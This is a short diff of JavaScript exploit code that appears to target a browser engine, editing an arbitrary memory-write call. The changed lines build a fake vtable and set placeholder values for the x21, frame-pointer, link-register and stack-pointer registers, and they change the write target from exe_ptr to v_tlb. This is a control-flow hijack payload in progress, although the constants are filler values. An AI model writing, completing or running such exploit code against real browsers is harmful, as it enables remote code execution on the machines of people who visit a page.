@@ -515,16 +515,16 @@ function foo(obj) {
         //log('anchor' + anchor)
         var hdr = Sub(anchor, anchor.lo() & 0xfff);
         var b = [];
-    memory.write_non_zero(exe_ptr, [
-        0x4141414141, // fake vtable
+    memory.write_non_zero(v_tlb, [
+        0x41414141, // fake vtable
         0,
-        0x4242424242, // x21
+        0x42424242, // x21
         0, 0, 0, 0, 0, 0, 0,
         0, // fp
 
-        0x313131313131, // lr
+        0x31313131, // lr
         0,
-        0x5151515151, // sp
+        0x51515151, // sp
     ])
         d.addEventListener('click', function(){})
         /*
